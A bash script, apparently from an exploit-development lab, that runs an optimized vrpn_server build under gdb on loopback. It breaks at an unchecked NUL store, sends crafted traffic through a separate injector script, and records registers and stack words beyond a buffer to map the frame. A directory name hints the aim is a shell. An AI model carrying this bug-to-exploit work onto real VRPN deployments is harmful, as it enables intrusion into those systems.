#!/usr/bin/env bash
# Optimized-build frame geometry at the unchecked NUL store. Uses only gdb
# registers and the source-line breakpoint: no address of the by-value 'p'
# (optimized out at -O2, which breaks probe-frame-write.sh). Loopback only.
# Usage: probe-opt-frame.sh <outdir> <port> <index>
# Env overrides: BIN, MSGTYPE, LINE.
set -uo pipefail
OUT=${1:?usage: probe-opt-frame.sh <outdir> <port> <index>}
PORT=${2:?port required}
IDX=${3:?index required}
BIN=${BIN:-lab/frontier/vrpn2shell/build-opt-07.36/server_src/vrpn_server}
MSGTYPE=${MSGTYPE:--1}
LINE=${LINE:-4554}

cd "$(dirname "$0")/../../.." || exit 2
mkdir -p "$OUT"
{
  echo "date_utc=$(date -u +%FT%TZ)"
  echo "bin=$BIN"
  echo "bin_sha256=$(sha256sum "$BIN")"
  echo "port=$PORT index=$IDX msgtype=$MSGTYPE line=$LINE"
} >"$OUT/meta.txt"
cat >"$OUT/gdb.cmd" <<EOF
set pagination off
set confirm off
set disassembly-flavor intel
break vrpn_Connection.C:$LINE
commands
silent
printf "HIT-REGS pc=%p rbp=%p rsp=%p rdi=%p rsi=%p rdx=%p rcx=%p rax=%p rbx=%p\\n", \$pc, \$rbp, \$rsp, \$rdi, \$rsi, \$rdx, \$rcx, \$rax, \$rbx
x/12i \$pc-24
info registers rax rbx rcx rdx rsi rdi rbp rsp r8 r9 r10 r11
printf "HIT-VAR i=%d &sender_name=%p\\n", i, &sender_name
printf "HIT-WORDS +104=%p +112=%p +120=%p +128=%p +136=%p\\n", *(void**)((char*)&sender_name+104), *(void**)((char*)&sender_name+112), *(void**)((char*)&sender_name+120), *(void**)((char*)&sender_name+128), *(void**)((char*)&sender_name+136)
bt 5
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$OUT/gdb.cmd" --args "$BIN" \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 2
python3 lab/frontier/vrpn2shell/wire_inject.py \
  --index "$IDX" --port "$PORT" --msgtype "$MSGTYPE" \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== $OUT"; cat "$OUT/meta.txt"
echo "--- client"; cat "$OUT/client.txt"
echo "--- gdb key lines"
grep -E 'HIT-|=>|mov.*BYTE|\$0x0|breakpoint|instruction|SIGSEGV|SIGILL|SIGABRT|exited|No symbol|not available|Optimized out|Cannot|Can.t' "$OUT/gdb.log" | head -80
